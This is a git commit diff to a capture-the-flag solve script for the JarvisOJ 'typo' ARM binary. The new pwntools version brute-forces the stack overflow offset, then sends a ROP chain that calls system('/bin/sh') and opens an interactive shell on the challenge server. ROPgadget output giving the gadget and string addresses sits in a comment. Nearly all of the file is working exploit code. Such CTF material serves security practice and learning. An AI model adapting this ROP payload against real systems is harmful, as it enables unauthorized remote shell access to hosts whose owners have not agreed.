d3d6a730576f99bd6fa5d01116a182e0457d26f2
0x01f <aboultraman@gmail.com>
2018-07-31 23:23:25 +0800

    arm rop

--- jarvisOJ_typo/solve.py
+++ jarvisOJ_typo/solve.py
@@ -2,26 +2,38 @@
 # -*- coding: utf-8 -*-
 __Auther__ = 'M4x'
 
-
-from zio import *
-from time import sleep
+from pwn import *
 import sys
+#  context.log_level = "debug"
 
-if sys.argv[1] == "l":
-    conn = "qemu-arm ./typo"
-else:
-    conn = ('pwn2.jarvisoj.com', 9888)
-
-io = zio(conn, timeout = 10000, print_read = COLORED(RAW, 'red'), print_write = COLORED(RAW, 'green'))
-io.read_until("quit\n")
-io.writeline()
-
-pop_r0_r4_pc = 0x20904
-sh_addr = 0x6c384
-system_addr = 0x110B4
-
-payload = 'a' * 0x70 + l32(pop_r0_r4_pc) + l32(sh_addr) + l32(0) + l32(system_addr)
-io.writeline(payload)
-io.interact()
-io.close()
-
+for i in range(100, 150)[::-1]:
+    try:
+        if sys.argv[1] == "l":
+            io = process("./typo", timeout = 2)
+        elif sys.argv[1] == "d":
+            io = process(["qemu-arm", "-g", "1234", "./typo"])
+        else:
+            io = remote("pwn2.jarvisoj.com", 9888, timeout = 2)
+        
+        io.sendafter("quit\n", "\n")
+        io.recvline()
+        
+        '''
+        jarvisOJ_typo [master●●] ROPgadget --binary ./typo --string /bin/sh
+        Strings information
+        ============================================================
+        0x0006c384 : /bin/sh
+        jarvisOJ_typo [master●●] ROPgadget --binary ./typo --only "pop|ret" | grep r0
+        0x00020904 : pop {r0, r4, pc}
+        '''
+        
+        payload = 'a' * i + p32(0x20904) + p32(0x6c384) * 2 + p32(0x110B4)
+        success(i)
+        io.sendlineafter("\n", payload)
+        
+        io.interactive()
+        #  io.close()
+    except:
+        io.close()
+        
+            
